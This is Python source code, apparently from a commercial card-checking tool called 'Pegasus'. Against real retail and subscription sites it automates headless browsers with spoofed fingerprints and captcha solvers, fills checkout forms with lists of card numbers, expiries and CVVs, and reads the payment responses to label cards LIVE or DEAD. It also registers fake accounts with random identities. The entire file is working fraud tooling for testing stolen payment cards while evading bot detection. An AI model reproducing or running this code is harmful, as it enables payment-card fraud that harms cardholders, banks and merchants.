                        sb.type('#billing_phone', phone_number)

                        sb.wait_for_element('#stripe-card-element > div > iframe', timeout=10)
                        sb.switch_to_frame('#stripe-card-element > div > iframe')
                        sb.type('#root > form > span:nth-child(4) > div > div > div.CardNumberField-input-wrapper > span > input', self.ccs[self.cont])
                        sb.switch_to_default_content()

                        sb.wait_for_element('#stripe-exp-element > div > iframe',  timeout=10)
                        sb.switch_to_frame('#stripe-exp-element > div > iframe')
                        sb.type('#root > form > span:nth-child(4) > div > span > input', fecha)
                        sb.switch_to_default_content()

                        sb.wait_for_element('#stripe-cvc-element > div > iframe', timeout=10)
                        sb.switch_to_frame('#stripe-cvc-element > div > iframe')
                        sb.type('#root > form > span:nth-child(4) > div > span > input', self.cvv[self.cont])
                        sb.switch_to_default_content()

                        sb.click('#terms')
                        sb.click('#place_order')

                        # Analizando

                        try:
                            time.sleep(random.uniform(3, 5))
                            sb.wait_for_element('body > div:nth-child(1) > iframe', timeout=15)
                            sb.switch_to_frame('body > div:nth-child(1) > iframe')
                            sb.wait_for_element('#challengeFrame')
                            sb.switch_to_frame('#challengeFrame')
                            msgPay = sb.get_text('body')

                            ulti = self.ccs[self.cont][-4:]
                            palabras_clave = ["termina en", "hemos enviado", "el monto de", "mensaje de texto", "xxx-xxx-", "authorized cardholder", "passcode", "Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                            encontrada = any(palabra in msgPay for palabra in palabras_clave)
                            
                            if encontrada:
                                if self.tools.repetir(livemsg) == True:
                                    self.text_dead.emit(deadmsg)
                                else:
                                    self.text_live.emit(livemsg)
                            else:
                                self.text_dead.emit(deadmsg)


                        except:
                            msgPay = sb.get_text('#post-7 > div > div > form.checkout.woocommerce-checkout > div.woocommerce-NoticeGroup.woocommerce-NoticeGroup-checkout')
                            

                            if 'rechazada' in msgPay:
                                self.text_dead.emit(deadmsg)
                            else:
                                self.text_dead.emit(deadmsg)
                                msg = msgPay + " " + deadmsg
                                self.printed.emit(msg)

                            
                        sb.switch_to_default_content()
                        sb.refresh()
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def elpais(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        extension_path = 'config/CaptchaSolver/CaptchaSolver.crx'

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })
            
            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                emails = [
                    'gloria48_993@patyc.org'
                ]

                links = [
                    'https://elpais.com/subscriptions/#/sign-in?backURL=https://elpais.com/suscripciones/premium/upgrade/?prod=SUSDIGCOL&o=botoncol_cab&prm=suscrip_cabecera_el-pais_colombia&backURL=https%3A%2F%2Felpais.com%2Fus%2F'
                ]

                link = random.choice(links)
                email = random.choice(emails)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)
                    #original_tab = sb.driver.current_window_handle

                    sb.click('#didomi-notice-learn-more-button')
                    sb.click('#didomi-radio-option-disagree-to-all')
                    sb.click('#didomi-consent-popup > div > div > div > div > div.didomi-consent-popup-footer.didomi-popup-footer > div > button')

                    #sb.click('#fusion-app > article > div > div > a')

                    #sb.open_new_tab()
                    #new_tab = sb.driver.current_window_handle
                    #sb.switch_to_window(new_tab)
                    #sb.open("https://temp-mail.io/es")
                    #sb.open("https://correotemporal.org/")
                    #time.sleep(random.uniform(3, 6))
                    #sb.switch_to_window(new_tab)
                    #print('Obteniendo email')
                    #email = sb.get_text('#email')
                    #print('EMAIL OBTENIDO', email)
                    #sb.switch_to_window(original_tab)

                    #sb.type('#subsEmail', email)
                    #sb.type('#subsPassword', 'Pegasus123*')
                    #sb.select_option_by_value('#fusion-app > article > div > div > div > div.col.container_row.padding_sm.desktop_6.desktop_offset_3.tablet_6.tablet_offset_1.text_align_center > div.dateIden > div.cajas > div:nth-child(1) > select', '13')
                    #sb.select_option_by_value('#fusion-app > article > div > div > div > div.col.container_row.padding_sm.desktop_6.desktop_offset_3.tablet_6.tablet_offset_1.text_align_center > div.dateIden > div.cajas > div:nth-child(2) > select', '2')
                    #sb.select_option_by_value('#fusion-app > article > div > div > div > div.col.container_row.padding_sm.desktop_6.desktop_offset_3.tablet_6.tablet_offset_1.text_align_center > div.dateIden > div.cajas > div:nth-child(3) > select', '2000')
                    
                    #sb.click("#fusion-app > article > div > div > div > div.col.container_row.padding_sm.desktop_6.desktop_offset_3.tablet_6.tablet_offset_1.text_align_center > div.mb-2 > div:nth-child(1) > label")

                    #sb.click('#subsSignUp')
                    #time.sleep(random.uniform(3, 6))
                    #sb.switch_to_window(new_tab)


                    sb.type('#subsEmail', email)
                    sb.type('#subsPassword', 'Pegasus123*')
                    sb.click('#subsSignIn')

                    sb.click('#ispparcn1198', timeout=15)

                    sb.click('#subsCheckout', timeout=20)

                    sb.type('#firstName', self.first1, timeout=15)
                    sb.type('#lastName', self.last1)
                    sb.click('#fusion-app > article > div.article.\|.col > div.checkout-s > div > div > div.ps-container-B > div > div.ps-card.ps-card-current > div > form > p > button')

                    time.sleep(random.uniform(1, 2))

                    sb.select_option_by_value('#country', 'CO')
                    time.sleep(random.uniform(1, 2))

                    sb.select_option_by_value('#region', 'Antioquia')
                    time.sleep(random.uniform(1, 2))

                    sb.click('#subsCheckout')

                    sb.click('#ispparcn1198')

                    sb.click('#subsCheckout')

                    url = sb.get_current_url()
                    sb.activate_cdp_mode(url)
                    sb.uc_gui_click_captcha('iframe[src*="/recaptcha/"]')
                    sb.assert_element("img#captcha-success", timeout=3)
                    sb.set_messenger_theme(location="top_left")
                    sb.post_message("SeleniumBase wasn't detected", duration=3)
                    time.sleep(500)
                    time.sleep(500)
                    time.sleep(500)

                    sb.click('#fusion-app > article > div.article.\|.col > div.ps-container.ps-my-0.ps-py-8 > div > div > div > div.ps-mb-0.ps-pb-16.ps-flex.ps-flex-justify-center.ps-flex-align-stretch > div:nth-child(2) > div:nth-child(2) > button')
                    sb.click('#upgrade-confirmation-modal > div > div > button.ps-btn.ps-btn-primary')




                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def mymesinc(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                citys = [
                    ''
                ]

                links = [
                    'https://www.mymesinc.com/product_p/0180.htm',
                    'https://www.mymesinc.com/product_p/7-48.htm',
                    'https://www.mymesinc.com/product_p/1600.htm',
                    'https://www.mymesinc.com/product_p/2410.htm'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)

                    sb.click('#btn_addtocart')
                    sb.click('#vol-push-cart > div > footer > div.push-cart__footer__control > div.push-cart__payment.clearfix > a.btn.btn-lg.btn-primary.push-cart__payment--btn.push-cart__checkout.pull-right')

                    # Form Billing

                    sb.type('#v65-onepage-billfirstname', self.first1)
                    sb.type('#v65-onepage-billlastname', self.last1)
                    sb.type('#v65-onepage-billaddr1', address)
                    sb.type('#v65-onepage-billcity', 'Sunrise')
                    sb.type('#v65-onepage-billcity', 'Sunrise')
                    sb.select_option_by_value('#BillingState_dropdown', 'FL')
                    sb.type('#v65-onepage-billpostalcode', '33351')
                    sb.type('#v65-onepage-billphone', phone_number)
                    sb.type('#v65-onepage-billphone', phone_number)
                    sb.type('#v65-cart-billemail', email)

                    sb.type('#v65-onepage-registrationpassword-row > td:nth-child(2) > input[type=password]', 'Pegasus123*')
                    sb.type('#v65-onepage-registrationpassword-confirm-row > td:nth-child(2) > input[type=password]', 'Pegasus123*')
                    sb.click('#ship-to-options-table > tbody > tr:nth-child(2) > td:nth-child(2) > input[type=radio]:nth-child(1)')

                    sb.select_option_by_value('#PaymentMethodTypeDisplay', 'Credit Card')

                    contador = 0
                    while self.cont < self.total_lines and contador < 20:

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"

                        sb.wait_for_element("//iframe[starts-with(@src, 'https://core.spreedly.com/v1/embedded/number-frame-')]")
                        sb.switch_to_frame("//iframe[starts-with(@src, 'https://core.spreedly.com/v1/embedded/number-frame-')]")
                        sb.type('#card_number', self.ccs[self.cont])

                        sb.switch_to_default_content()
                        sb.type('#CardHoldersName', fullname)

                        sb.select_option_by_value('#CC_ExpDate_Month', self.mes[self.cont])
                        sb.select_option_by_value('#CC_ExpDate_Year', self.anio[self.cont])

                        sb.wait_for_element("//iframe[starts-with(@src, 'https://core.spreedly.com/v1/embedded/cvv-frame-')]")
                        sb.switch_to_frame("//iframe[starts-with(@src, 'https://core.spreedly.com/v1/embedded/cvv-frame-')]")
                        sb.type('#cvv', self.cvv[self.cont])

                        sb.switch_to_default_content()

                        sb.select_option_by_value('#DisplayShippingSpeedChoicesTD > select', '502')

                        time.sleep(random.uniform(3, 5))

                        sb.click('#btnSubmitOrder')

                        # Analizando resultados

                        time.sleep(random.uniform(2, 4))
                        msgPay = sb.get_text('#FormatListofErrorsDiv', timeout=15)
                        print(msgPay)

                        if 'CVV does not match' in msgPay:
                            if self.tools.repetir(livemsg) == True:
                                msg = "RELIVE"
                                deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}{msg}\n"
                                self.text_dead.emit(deadmsg)
                            else:
                                self.text_live.emit(livemsg)

                        elif 'number is invalid' in msgPay or 'Payment declined.' in msgPay:
                            self.text_dead.emit(deadmsg)

                        elif 'Maximum orders per day' in msgPay:
                            self.text_changed.emit('🚫 IP**: ✈️ El vuelo de Pegasus fue detenido por alta actividad desde tu IP. 🛑')
                            break
                        else:
                            time.sleep(500)
                            time.sleep(500)
                            time.sleep(500)
                            

                        
                        sb.refresh()
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1


                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def westernunion(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.westernunion.com/us/en/web/user/register'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)

                    sb.type('#txtEmailAddr', email)
                    sb.type('#password', 'Pegasus123*')
                    sb.click('#button-continue')
                    time.sleep(500)
                    time.sleep(500)
                    time.sleep(500)



                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def timesprime(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"60{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.timesprime.com/'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)
                    
                    try:
                        sb.click('#odp2-cta', timeout=4)
                    except:
                        sb.click("//div[contains(//div, 'Memberships')]")
                        sb.click('#odp2-cta', timeout=10)

                    sb.type("//input[@placeholder='Enter your mobile number' and @type='tel']", phone_number)

                    sb.click("//button[text()='JOIN NOW']", timeout=10)
                    sb.click("//button[text()='GOT IT']", timeout=10)

                    try:
                        btn = sb.wait_for_element_clickable("//button[text()='GOT IT']")
                        sb.execute_script("arguments[0].click();", btn)
                    except Exception as e:
                        print("Error con btn GOT IT", e)
                        pass

                    contador = 0

                    while self.cont < self.total_lines and contador <= 5:

                        time.sleep(random.uniform(3, 4))
                        sb.refresh()

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        brand = self.ccs[self.cont][0:1]
                        binCC = self.ccs[self.cont][0:6]

                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"

                        if self.username == "ZenoxPav":
                            try:
                                print("Zenox AUTH")
                                sb.click("//button[//span[contains(text(), 'PAY') or contains(text(), 'PAY ')]]")
                            except Exception as e:
                                print("Error en:", e)
                                time.sleep(500)
                        else:
                            sb.click("//button[//span[contains(text(), 'PAY') or contains(text(), 'PAY ')]]")

                        
                        sb.wait_for_element('#payment-container > iframe')
                        sb.switch_to_frame('#payment-container > iframe')

                        time.sleep(random.uniform(3, 5))
                        self.text_changed.emit('El vuelo de Pegasus ha comenzado... 🐎 Reuniendo sabiduría. ⏳')
                        
                        try:
                            btn = sb.wait_for_element_clickable("//div[@id='10000032']//article[text()='Credit / Debit Cards']", timeout=5)
                            sb.execute_script("arguments[0].click();", btn)
                        except Exception as e:
                            print('Fallo en:', e)
                            pass
                    
                        # Form Pay
                        sb.type("//input[@name='cc-number']", self.ccs[self.cont])
                        sb.type("//input[@name='cc-exp']", fecha)
                        sb.type("//input[@name='cc-csc']", self.cvv[self.cont]) 

                        time.sleep(random.uniform(3, 4))

                        btn = sb.wait_for_element_clickable("//div//article[contains(text(), 'PROCEED TO PAY') or contains(text(), 'Proceed to pay')]")
                        sb.execute_script("arguments[0].click();", btn)
                        #sb.click("//div[//article[contains(text(), 'Proceed to pay')]]")

                        # Analizando resultados

                        try:
                            escudo = 0
                            while True:
                                print('Repitiendo bucle')
                                url = sb.get_current_url()
                                print(url)
                                try:
                                    msgPay = sb.get_text('body')
                                except:
                                    pass
                                print(msgPay)
                                if "authentication.cardinalcommerce" in url or "rsa3dsauth" in url or "3ds2" in url:
                                    msgPay = sb.get_text('body')
                                    ulti = self.ccs[self.cont][-4:]
                                    palabras_clave = ["termina en", "hemos enviado", "el monto de", "mensaje de texto", "Learn more about authentication", "Call me", "Text me", "confirm your identity", "using your card ending in", "XXXXXX", "xxx-xxx-", "authorized cardholder", "passcode", "Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                                    encontrada = any(palabra in msgPay for palabra in palabras_clave)
                                    
                                    if encontrada:
                                        if self.tools.repetir(livemsg) == True:
                                            self.text_dead.emit(deadmsg)
                                        else:
                                            if self.recheck == True:
                                                payitRecheck(self)
                                                #allhands(self)
                                            
                                    else:
                                        self.text_dead.emit(deadmsg)

                                    time.sleep(random.uniform(3, 4))
                                    sb.click('#ExitLink', timeout=3)
                                    

                                #elif 'secure.payu' in url or 'threeDSecure' in url:
                                #    print("Procesado por Payu IN")
                                #    if binCC == "422274":
                                #        continue
                                #    else:
                                #        self.text_dead.emit(deadmsg)
                                #    break

                                elif 'Transaction Failed' in msgPay:
                                    if binCC == "422274":
                                        self.text_live.emit(livemsg)
                                    else:
                                        self.text_dead.emit(deadmsg)
                                    break

                                else:
                                    if escudo == 30:
                                        break
                                    time.sleep(1)

                        except Exception as e:
                            print("Error en try", e)
                        
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def zulily(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.zulily.com/products/red-santa-hats-42103246?searchidx=0&variant=50351604859196'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def ControllerVix(self):

    while True:
        status = vix(self)
        if "BAN" in status:
            vix(self)
        else:
            break
    return True

def vix(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    headless2 = getHeadless(self)
    user_agent, device_metrics = openBrowser(1, headless2)

    with SB(test=False, do_not_track=True, extension_zip="config/Buster-Captcha-Solver-for-Humans-Chrome-Web-Store.crx", mobile=True, uc=True, headless2=headless2) as sb:

        sb.save_screenshot_after_test = False
        sb.save_page_source_after_test = False

        if "Macintosh" in user_agent:

            platform = "MacIntel"

        elif "Windows" in user_agent:

            platform = "Win32"

        else:

            platform = "Linux"

        sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

            "userAgent": user_agent,
            "platform": platform,

        })
        
        sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

            "mobile": True,
            "width": device_metrics["width"],
            "height": device_metrics["height"],
            "deviceScaleFactor": device_metrics["deviceScaleFactor"],
            "fitWindow": True

        })

        self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

        try:

            if self.tools.validate_creditos(self.username,self.password) == True:
                self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                return None

            email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
            phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
            address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
            fullname = self.first1 + ' ' + self.last1
            dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

            links = [
                'https://vix.com/es-es/suscripcion/crear-nueva-cuenta'
            ]

            link = random.choice(links)
            
            print('USER AGENT ACTUAL:', sb.get_user_agent())


            try:
                random_number = random.randint(1, 15)
                #sb.driver.uc_open_with_reconnect("https://pixelscan.net/", random_number)
                #sb.remove_elements("jdiv")  # Remove chat widgets
